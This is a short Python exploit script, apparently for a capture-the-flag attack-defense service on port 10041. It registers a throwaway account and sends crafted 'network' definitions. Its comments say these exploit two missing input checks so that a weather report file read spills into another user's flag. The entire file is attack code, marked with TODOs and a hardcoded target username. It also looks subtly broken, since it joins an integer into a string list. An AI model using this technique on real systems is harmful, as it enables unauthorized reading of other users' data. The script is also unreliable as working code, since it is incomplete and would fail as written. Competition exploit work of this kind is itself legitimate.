#!/usr/bin/python3
import base64
import gzip
import hexdump
import random
import requests
import string
import struct
import sys

# TODO: Weather layer with ELU to read flag

def exploit(ip, flag_id):
	s = requests.Session()

	username = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(16))
	password = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(16))
	s.post(f'http://{ip}:10041/registration', params={'username': username, 'password': password})

	admin_uname = 'aRV4pVM9'  # TODO get from flag id
	filename1 = f"{admin_uname}_v1"
	filename2 = f"{admin_uname}_v2"

	# check how many floats in weather report
	FLAG_LEN = 40
	r = s.get(f'http://{ip}:10041/report/read/{filename1}')
	weather_file = r.text
	print(weather_file)
	weather_count = len(weather_file.splitlines()[0].split(','))
	chars_to_read = weather_count + FLAG_LEN

	# Bug with file 1: no check if the file has enough floats
	nn_1 = '\n'.join(['WeatherLayer linear'] + [chars_to_read] + ['InputNode 1'] * chars_to_read + [filename1]) + '\n'
	r = s.post(f'http://{ip}:10041/network', params={'net': nn_1})
	print(r.text)
	# TODO parse from nn outs

	# Bug with file 2: no check if second line has elu params or is only newline
	nn_2 = '\n'.join(['WeatherLayer explu'] + [chars_to_read] + ['InputNode 1'] * chars_to_read + [filename1]) + '\n'
	r = s.post(f'http://{ip}:10041/network', params={'net': nn_2})
	print(r.text)
	# TODO parse from nn outs


if __name__ == '__main__':
	if len(sys.argv) != 3:
		sys.stderr.write('Usage: ./exploit1_2.py IP FLAG_ID\n')
		sys.exit(1)
	exploit(sys.argv[1], sys.argv[2])
